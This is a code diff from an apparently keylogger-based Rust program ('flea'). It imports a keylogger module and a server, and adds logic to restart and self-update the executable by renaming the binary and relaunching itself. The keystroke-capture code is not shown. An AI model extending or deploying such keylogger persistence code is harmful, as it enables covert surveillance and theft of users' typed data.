@@ -8,6 +8,7 @@ extern crate getopts;
 use std::{thread, env};
 use std::sync::{Arc, Mutex};
 use std::sync::atomic::{AtomicBool, Ordering};
+use flealib::commandprocessor::RESTART_FILENAME;
 use flealib::fleaserver::FleaServer;
 use flealib::keylogger::*;
 use getopts::Options;
@@ -49,7 +50,7 @@ fn main()
     let mut program_dir = program_dir.replace(&args[0].split(&separator).last().unwrap(), "");    
     if program_dir.is_empty()
     {
-        //if the path is empty, set the current directory
+        //if the path is empty, get the current directory
         program_dir = env::current_dir().unwrap().to_str().unwrap().to_string();
     }
     else
@@ -65,6 +66,13 @@ fn main()
         if let Ok(_) = std::fs::remove_file(BACKUP_FILENAME) {}
     }
 
+    //Check if restart file exists
+    if std::path::Path::new(RESTART_FILENAME).exists()
+    {
+        //Delete the restart file
+        if let Ok(_) = std::fs::remove_file(RESTART_FILENAME) {}
+    }
+
     //Finds if there is update available
     updater::find_update(&program_dir, UPDATE_FILENAME).map(|x| 
     {
@@ -72,9 +80,9 @@ fn main()
          //Rename current file to the backup name
         std::fs::rename(FLEA_FILE_NAME, BACKUP_FILENAME).expect("Couldn't rename the current file!");
         //Rename the update file to the current executable name
-        std::fs::rename(x, FLEA_FILE_NAME).expect("Couldn't rename the update file!");
+        std::fs::rename(x, FLEA_FILE_NAME).expect("Couldn't rename the update file!");        
         //Starts a new process of itself
-        updater::start_new_process();
+        updater::start_new_process(&program_dir, FLEA_FILE_NAME.to_string());
         //Exits the current process
         std::process::exit(exitcode::OK);
     });
@@ -140,5 +148,16 @@ fn main()
 
     info!("Stop");
     
+    //if restart file exists, start a new process of itself
+    if std::path::Path::new(RESTART_FILENAME).exists()
+    {
+        //Delete the restart file
+        if let Ok(_) = std::fs::remove_file(RESTART_FILENAME) {}
+        //Starts a new process of itself
+        updater::start_new_process(&program_dir, FLEA_FILE_NAME.to_string());
+
+        info!("Restart");
+    }
+
     std::process::exit(exitcode::OK);
 }
